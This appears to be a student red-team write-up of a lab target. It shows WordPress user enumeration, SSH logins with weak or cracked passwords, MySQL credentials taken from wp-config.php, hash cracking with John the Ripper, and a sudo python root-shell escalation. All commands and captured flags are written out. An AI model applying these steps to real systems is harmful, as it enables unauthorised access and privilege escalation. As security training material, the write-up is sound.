# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services


Nmap scan results for each machine reveal the below services and OS details:

![nmap target1](Images/nmap target1.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - List of Exposed Services
	1. Port 22/TCP - Open SSH
	2. Port 80/TCP - Open HTTP
	3. Port 111/TCP - Open rpcbind
	4. Port 139/TCP Open netbios-ssn
	5. Port 445/TCP Open netbios-ssn

The following vulnerabilities were identified on each target (with severity levels):

Target 1
- User Enumeration (Wordpress) - Medium
- Weak Password Implementation - Critical
- No file security permission implemented - High
- Use of weak password salted hashes - High
- Python root escalation privileges - Critical
- Directory traversal - High


### Exploitation


The Red Team was able to penetrate `Target 1` retrieve the following confidential data:
- Target 1
  - `flag1.txt`:{b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
      - SSH to server using weak password
      - After enumerating users with wpscan --url http://192.168.1.110 --enumerate u, the user Michael's password was exploited. SSH connection was established by: ssh michael@192.168.1.110, password:michael.
![users enumerate](Images/users enumerate.png)
![ssh](Images/ssh.png)
      - The flag was found using: grep -R flag1
![flag1](Images/flag1.png)

  - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - Same exploit as Flag 1
      - The second flag was found moving into the /var/www directory while searching for the wp-config.php file. The following commands were used: cd .., ls -ah, cat flag2.txt
![flag 2](Images/flag 2.png)
  
  - `flag3.txt`: {afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used**
      - Accessing mysql database using the wp-config.php file
      - The wp-config.php contained the login credentials for the mysql Wordpress database. Commands used: mysql -u root -pR@v3nSecurity wordpress, show tables;, select * from wp_posts;
![flag 3 n 4](Images/flag 3 n 4.png)

  - `flag4.txt`: {715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**
      - Same exploit as Flag 3
      - The third and fourth flag were found together in the mysql database. Note: Another way to obtain flag 4 is to get Steven's password hash from the wp_users table in the database. Using JohnTheRipper, john/root/Desktop/hashes.txt --wordlist=rockyou.txt, gave pink84 as Steven's password. From there an SSH connection could be made: ssh steven@192.168.1.110. To escalate to root after seeing Steven has python sudo access using sudo -l, the following command gave root access: sudo ./python -c 'import os;os.system("/bin/bash")'
![steven pass](Images/steven pass.png)
![flag4](Images/flag4.png)